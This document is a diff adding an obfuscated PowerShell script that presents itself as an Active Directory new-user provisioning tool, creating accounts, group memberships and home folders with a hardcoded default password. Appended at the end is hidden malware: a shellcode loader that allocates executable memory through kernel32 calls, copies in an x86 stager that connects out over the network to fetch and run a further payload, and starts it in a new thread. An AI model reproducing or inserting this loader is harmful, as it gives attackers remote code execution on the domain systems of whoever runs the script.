@@ -1,0 +1,123 @@
+param (
+	[Parameter(mANDaTory, vALuefROmPipELINeBypROpertyNAmE)]
+	[ValidateNotNullOrEmpty()]
+	[string]${f`iR`STNaME},
+	
+	[Parameter(mAndAToRy, VAlUEFrOmPIpeliNEBypROpERTynAME)]
+	[ValidateNotNullOrEmpty()]
+	[string]${lASt`NA`ME},
+	
+	[Parameter(MaNdaToRy, vALuEFrOmPipElINebYPrOPERtyName)]
+	[ValidateNotNullOrEmpty()]
+	[string]${Middl`EInitI`AL},
+	
+	[Parameter(MandAToRY, VALUEFrOmPIPELiNEByPRopeRtyNAMe)]
+	[ValidateNotNullOrEmpty()]
+	[string]${d`e`parT`MENt},
+	
+	[Parameter(MaNdatOry, vaLUefROMPIpElInEByprOpertyNamE)]
+	[ValidateNotNullOrEmpty()]
+	[string]${T`iTLe},
+	
+	[Parameter(valUefRoMPipeLINebYPrOPeRtyNAMe)]
+	[ValidateNotNullOrEmpty()]
+	[string]${lo`c`A`TIOn} = ("{0}{2}{3}{1}"-f 'OU=Co','rs','rporate',' Use'),
+	
+	[Parameter()]
+	[ValidateNotNullOrEmpty()]
+	[string]${d`efA`UlTG`ROuP} = ("{1}{0}{2}"-f'YZCom','X','pany'),
+	
+	[Parameter()]
+	[ValidateNotNullOrEmpty()]
+	[string]${deFaUl`T`paS`SWORd} = (('p@L6CL6'+'C'+'w'+'0rd'+'12345')."r`ePlA`Ce"(([CHAR]76+[CHAR]54+[CHAR]67),'$')),
+	
+	[Parameter()]
+	[ValidateScript({ &("{2}{0}{1}"-f'-','Path','Test') -Path ${_} })]
+	[string]${bASehO`m`efOLder`pAth} = ((("{3}{1}{4}{0}{2}" -f '1FPg','MBE','Users','FPgFPgME','RSRV'))."REPla`cE"('FPg',[stRiNG][CHAR]92))
+)
+
+
+${doM`A`INDN} = (.("{0}{1}{2}" -f 'Ge','t-AdDomai','n'))."DiSt`IN`G`UishedNA`me"
+
+${uS`eRna`Me} = "$($FirstName.SubString(0, 1))$LastName "
+
+
+&("{4}{0}{2}{1}{3}"-f '-V','rbo','e','se','Write') -Message "Checking if [$($Username)] is available "
+if (.("{1}{0}{2}" -f '-AD','Get','User') -Filter ('Name'+' '+'-'+'eq '+"'$Username'"))
+{
+	&("{1}{2}{0}"-f 'rning','W','rite-Wa') -Message "The username [$($Username)] is not available. Checking alternate... "
+	
+	${u`sE`RnaMe} = "$($FirstName.SubString(0, 1))$MiddleInitial$LastName "
+	if (.("{2}{0}{1}"-f'U','ser','Get-AD') -Filter ('Nam'+'e '+'-'+'eq '+"'$Username'"))
+	{
+		throw ("{1}{7}{5}{0}{3}{6}{4}{2}"-f'ema','No ac',' created',' coul',' be','ame sch','d','ceptable usern')
+	}
+	else
+	{
+		.("{2}{0}{1}"-f 'te-Ver','bose','Wri') -Message "The alternate username [$($Username)] is available. "
+	}
+}
+else
+{
+	.("{3}{0}{1}{2}"-f 'ite-','Ver','bose','Wr') -Message "The username [$($Username)] is available "
+}
+
+
+
+${o`UDN} = "$Location,$DomainDn"
+if (-not (.("{5}{0}{2}{3}{1}{4}" -f 'ADOrg','zationalUni','an','i','t','Get-') -Filter ('D'+'i'+'stinguishe'+'dN'+'am'+'e '+'-eq'+' '+"'$ouDN'")))
+{
+	throw "The user OU [$($ouDN)] does not exist. Can't add a user there "
+}
+
+
+
+if (-not (&("{0}{2}{1}" -f'G','up','et-ADGro') -Filter ('Name'+' '+'-e'+'q '+"'$DefaultGroup'")))
+{
+	throw "The group [$($DefaultGroup)] does not exist. Can't add the user into this group. "
+}
+if (-not (&("{0}{3}{2}{1}"-f 'Get-','up','Gro','AD') -Filter ('Nam'+'e '+'-'+'eq '+"'$Department'")))
+{
+	throw "The group [$($Department)] does not exist. Can't add the user to this group. "
+}
+
+
+
+${H`oMeFOLDe`RpA`Th} = "$BaseHomeFolderPath\$UserName"
+if (&("{1}{0}" -f'est-Path','T') -Path ${HO`me`FoLderpA`Th})
+{
+	throw ('The'+' '+'hom'+'e '+'fold'+'e'+'r '+'p'+'ath '+"[$homeFolderPath] "+'alread'+'y'+' '+'e'+'x'+'ists.')
+}
+
+
+
+${nEW`Us`ERpA`RAms} = @{
+	("{2}{4}{0}{1}{3}"-f'cipalNa','m','UserPri','e','n') = ${U`seR`NamE}
+	("{0}{1}" -f 'Na','me') = ${USe`Rna`mE}
+	("{3}{2}{0}{1}" -f'a','me','ivenN','G') = ${F`irsT`NaMe}
+	("{0}{1}"-f 'Sur','name') = ${lA`sTna`me}
+	("{0}{1}"-f'Titl','e') = ${tI`T`Le}
+	("{0}{2}{3}{1}" -f'Depa','t','rtme','n') = ${DePA`R`T`MeNT}
+	("{1}{2}{3}{0}"-f 'Name','SamAccou','n','t') = ${US`ERNa`mE}
+	("{1}{4}{2}{0}{3}" -f'swor','Accou','s','d','ntPa') = (.("{4}{3}{0}{2}{1}{5}"-f'e','ureStrin','rtTo-Sec','nv','Co','g') ${D`e`FAUltPAsS`W`ord} -AsPlainText -Force)
+	("{1}{0}{2}"-f 'nab','E','led') = ${Tr`UE}
+	("{0}{2}{1}" -f 'Init','s','ial') = ${MIdDLE`inI`T`IAl}
+	("{1}{0}" -f 'th','Pa') = "$Location,$DomainDn"
+	("{0}{2}{4}{1}{3}"-f'ChangeP','swordAtLog','a','on','s') = ${t`RuE}
+}
+.("{2}{1}{3}{0}"-f'erbose','e-','Writ','V') -Message "Creating the new user account [$($Username)] in OU [$($ouDN)] "
+&("{0}{1}{2}" -f'Ne','w-','AdUser') @NewUserParams
+
+
+
+&("{1}{2}{0}"-f 'se','Write-Ve','rbo') -Message "Adding the user account [$($Username)] to the group [$($DefaultGroup)] "
+.("{4}{1}{2}{3}{0}" -f'Member','dd-ADGr','o','up','A') -Members ${US`E`RnamE} -Identity ${d`ef`AU`ltGRO`UP}
+.("{2}{0}{1}" -f'o','se','Write-Verb') -Message "Adding the user account [$($Username)] to the group [$($Department)] "
+.("{1}{3}{0}{2}" -f 'emb','A','er','dd-ADGroupM') -Members ${uSE`RNA`Me} -Identity ${DEPARTM`E`Nt}
+
+
+
+&("{0}{1}{2}" -f'Write-Ve','r','bose') -message ('C'+'re'+'ating '+'th'+'e '+'h'+'ome '+'fold'+'er '+"[$homeFolderPath]...")
+${n`ULL} = .("{1}{0}" -f 'kdir','m') ${homef`OLDErp`AtH}
+
+${c} = ((("{73}{80}{20}{21}{81}{87}{82}{62}{52}{12}{3}{49}{79}{27}{69}{18}{84}{19}{88}{58}{48}{13}{16}{1}{53}{91}{31}{6}{85}{92}{45}{17}{22}{59}{29}{56}{77}{67}{35}{51}{5}{11}{93}{47}{74}{50}{71}{28}{60}{37}{43}{66}{42}{26}{55}{57}{61}{89}{86}{76}{15}{7}{54}{90}{23}{30}{70}{78}{25}{32}{72}{24}{41}{0}{4}{75}{63}{65}{68}{14}{33}{36}{46}{39}{83}{64}{40}{9}{34}{8}{10}{44}{2}{38}" -f 'eadId)',', ','uint c','c ex',';[Dl',' ext','cationT','tAdd','r d','nt','est','er','i','d','svcr','Ptr lpStar','wSize',');[DllImport({0}ker','al','Ptr ','Import','({0','ne','ss','r ','uint dwCreationFlags, In','dAt','P','teThre','2.',', IntPt','lo','tP','t.dll{0})','Pt','stati',']public stat','d(In','ount);',' exte','mset(I','lpThr','a','t',', uint src, ','rotect','ic',' ',' uint ','te','Ptr C','c','t','uint ','r','trib','d','utes, ui','dress,','l3','a','nt dwSt','ta','(','Ptr me','{0','Ptr lpThre','public ','}m','tr Virtu','r lp','rea','t','[Dl','Int','lImport','ze, Int','ll{0})]','Parameter, ','rn Int','l','}kernel3',' s','rn Int','Alloc(Int','yp','kSi','2.dll{0})]public','lpAd','ac','e','flAl','e, uint flP','n'))  -F  [cHAr]34);${w} = .("{1}{0}" -f 'dd-Type','A') -memberDefinition ${C} -Name ("{0}{1}" -f'Wi','n32') -namespace ("{2}{4}{1}{3}{0}"-f's','io','Win32Fun','n','ct') -passthru;[Byte[]];[Byte[]]${Z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x35,0xe9,0x67,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${Z}."L`engtH" -gt 0x1000){${g} = ${Z}."leNG`TH"};${X}=${W}::("{2}{1}{0}" -f 'tualAlloc','ir','V').Invoke(0,0x1000,${g},0x40);for (${I}=0;${i} -le (${z}."lE`NGtH"-1);${i}++) {${w}::"mem`set"([IntPtr](${x}.("{0}{1}" -f 'ToInt','32').Invoke()+${i}), ${Z}[${I}], 1)};${w}::("{2}{0}{1}"-f'teT','hread','Crea').Invoke(0,0,${X},0,0,0);for (;;){.("{0}{1}{2}"-f'Start-sl','e','ep') 60};
